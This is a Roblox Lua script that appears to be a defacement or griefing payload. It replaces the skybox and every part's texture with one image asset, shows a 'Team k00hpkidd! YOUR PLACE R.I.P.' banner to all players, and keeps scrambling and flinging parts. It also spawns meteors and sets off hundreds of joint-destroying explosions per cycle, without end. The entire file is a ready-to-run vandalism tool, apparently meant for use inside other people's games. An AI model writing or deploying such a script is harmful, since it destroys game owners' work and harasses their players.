local skyId = "rbxassetid://114899125185086"
local textureId = "rbxassetid://114899125185086"
local textMessage = "Team k00hpkidd!\nYOUR PLACE R.I.P."

local mapSize = 1200
local explosionPerRound = 300
local delayTime = 0.15

local Lighting = game:GetService("Lighting")
local Players = game:GetService("Players")

local sky = Instance.new("Sky")
sky.SkyboxBk = skyId
sky.SkyboxDn = skyId
sky.SkyboxFt = skyId
sky.SkyboxLf = skyId
sky.SkyboxRt = skyId
sky.SkyboxUp = skyId
sky.Parent = Lighting

for _, obj in ipairs(workspace:GetDescendants()) do
	if obj:IsA("BasePart") then

		for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
			local t = Instance.new("Texture")
			t.Texture = textureId
			t.Face = face
			t.Parent = obj
		end

		task.spawn(function()
			while obj.Parent do
				obj.Rotation = Vector3.new(
					math.random(0,360),
					math.random(0,360),
					math.random(0,360)
				)
				obj.Color = Color3.new(math.random(), math.random(), math.random())

				if math.random(1,40) == 1 then
					obj.AssemblyLinearVelocity = Vector3.new(
						math.random(-150,150),
						math.random(40,200),
						math.random(-150,150)
					)
				end

				task.wait(0.2)
			end
		end)
	end
end

local function giveTextLabel(player)
	local gui = Instance.new("ScreenGui")
	gui.ResetOnSpawn = false
	gui.Parent = player:WaitForChild("PlayerGui")

	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1,0,0,120)
	label.BackgroundTransparency = 0.2
	label.BackgroundColor3 = Color3.new(0,0,0)
	label.TextColor3 = Color3.new(1,0,0)
	label.TextScaled = true
	label.Text = textMessage
	label.Parent = gui

	task.spawn(function()
		while label.Parent do
			label.TextColor3 = Color3.new(math.random(), math.random(), math.random())
			task.wait(0.2)
		end
	end)
end

for _, p in ipairs(Players:GetPlayers()) do
	giveTextLabel(p)
end
Players.PlayerAdded:Connect(giveTextLabel)
local function randPos()
	return Vector3.new(
		math.random(-mapSize, mapSize),
		math.random(10,150),
		math.random(-mapSize, mapSize)
	)
end

task.spawn(function()
	while true do
		if math.random(1,8) == 1 then
			local flash = Instance.new("PointLight")
			flash.Brightness = 8
			flash.Range = 50
			flash.Color = Color3.new(1, math.random(), math.random())
			flash.Parent = workspace

			task.delay(0.07, function()
				flash:Destroy()
			end)
		end
		task.wait(0.1)
	end
end)

local function spawnMeteor()
	local meteor = Instance.new("Part")
	meteor.Shape = Enum.PartType.Ball
	meteor.Size = Vector3.new(10,10,10)
	meteor.Color = Color3.new(0.2,0.2,0.2)
	meteor.Material = Enum.Material.Slate
	meteor.Anchored = false
	meteor.CanCollide = true
	meteor.Position = Vector3.new(
		math.random(-mapSize,mapSize),
		math.random(180,260),
		math.random(-mapSize,mapSize)
	)
	meteor.Parent = workspace

	local bv = Instance.new("BodyVelocity")
	bv.Velocity = Vector3.new(
		math.random(-15,15),
		-math.random(150,230),
		math.random(-15,15)
	)
	bv.MaxForce = Vector3.new(1e7,1e7,1e7)
	bv.Parent = meteor

	meteor.Touched:Connect(function(hit)
		if meteor.Parent == nil then return end

		local e = Instance.new("Explosion")
		e.Position = meteor.Position
		e.BlastRadius = 30
		e.BlastPressure = 350000
		e.DestroyJointRadiusPercent = 1
		e.Parent = workspace

		meteor:Destroy()
	end)

	task.delay(10, function()
		if meteor and meteor.Parent then
			meteor:Destroy()
		end
	end)
end

task.spawn(function()
	while true do
		spawnMeteor()
		task.wait(0.25)
	end
end)

while true do
	for _ = 1, explosionPerRound do
		local e = Instance.new("Explosion")
		e.Position = randPos()
		e.BlastPressure = math.random(0,300000)
		e.BlastRadius = math.random(5,25)
		e.DestroyJointRadiusPercent = 1
		e.Parent = workspace
	end

	task.wait(delayTime)
end
